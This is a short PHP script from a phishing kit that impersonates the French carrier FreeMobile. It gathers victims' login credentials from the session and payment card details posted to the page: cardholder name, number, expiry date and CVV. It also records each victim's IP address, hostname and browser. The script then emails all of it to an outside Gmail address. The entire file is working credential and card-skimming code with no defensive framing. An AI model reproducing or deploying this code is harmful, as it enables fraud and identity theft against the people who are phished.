:<?

$ip = getenv("REMOTE_ADDR");
$rx = "
-------------------+ FreeMobile 2014 +-------------------
User: ".$_SESSION['flogin']."
Pass: ".$_SESSION['fpwd']."
--------------------------------------
User: ".$_SESSION['slogin']."
Pass: ".$_SESSION['spwd']."
--------------------------------------
Holder Name: ".$_POST['xh']."
Number: ".$_POST['xn']."
Date: ".$_POST['xm']." / ".$_POST['xv']."
CVV: ".$_POST['xc']."
--------------------------------------
IP      : ".$ip."
HOST    : ".gethostbyaddr($ip)."
BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
-------------------+ FreeMobile 2014 +-------------------

";

$xmail = "sga3rass@gmail.com";

mail($xmail,"FreeMobile | ".$_SESSION['name']." | ".$_POST['xn'],$rx,"From: mail<mail>");

?>